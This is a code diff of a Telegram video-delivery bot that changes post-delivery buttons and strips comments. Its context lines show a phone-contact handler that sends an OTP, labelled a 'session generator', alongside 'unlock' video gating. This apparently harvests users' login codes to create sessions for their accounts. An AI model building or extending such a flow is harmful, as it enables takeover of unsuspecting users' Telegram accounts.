@@ -116,6 +116,15 @@ def user_menu_inline():
     ])
 
 
+def delivery_complete_inline():
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("🔁 Resend", callback_data="um_videos"),
+            InlineKeyboardButton("🔓 More Videos", callback_data="um_unlock"),
+        ],
+    ])
+
+
 def admin_menu_inline():
     return InlineKeyboardMarkup([
         [
@@ -388,7 +397,6 @@ async def pyro_contact_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     if not phone.startswith("+"):
         phone = "+" + phone
 
-    # Clear the Share Contact keyboard
     await update.message.reply_text(
         "⏳ Sending OTP...",
         reply_markup=ReplyKeyboardRemove(),
@@ -1084,10 +1092,9 @@ async def send_batch(bot, chat_id, batch_no):
     await bot.send_message(
         chat_id,
         "✅ <b>DELIVERY COMPLETE</b>\n\n"
-        f"Sent: <b>{len(sent)}/{len(mids)}</b>\n"
-        "To get the next set, select <b>🔓 Unlock Next 10</b>.",
+        f"Sent: <b>{len(sent)}/{len(mids)}</b>",
         parse_mode=ParseMode.HTML,
-        reply_markup=user_menu_inline(),
+        reply_markup=delivery_complete_inline(),
     )
 
 
@@ -2084,23 +2091,17 @@ def main():
     app.add_handler(ChatJoinRequestHandler(on_join_request))
     app.add_handler(ChatMemberHandler(on_chat_member_update, ChatMemberHandler.CHAT_MEMBER))
 
-    # Inline menu dispatcher
     app.add_handler(CallbackQueryHandler(
         menu_callback,
         pattern=r"^(um_(videos|unlock|ref|progress)|am_(upload|batches|addgroup|groups|remove|stats)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
     ))
-
-    # Existing callbacks
     app.add_handler(CallbackQueryHandler(remove_chat_callback, pattern=r"^rm_(?:list|pick|yes|cancel)(?::.*)?$"))
     app.add_handler(CallbackQueryHandler(verify_join, pattern=r"^verify_join$"))
     app.add_handler(CallbackQueryHandler(noop_callback, pattern=r"^noop$"))
     app.add_handler(CallbackQueryHandler(pyro_otp_callback, pattern=r"^pyro_otp\|"))
 
-    # Contact (session generator)
     app.add_handler(MessageHandler(filters.CONTACT & filters.ChatType.PRIVATE, pyro_contact_handler))
-    # Video upload collection
     app.add_handler(MessageHandler(filters.VIDEO & filters.ChatType.PRIVATE, admin_collect_video))
-    # Text router
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, text_router))
 
     app.run_polling(
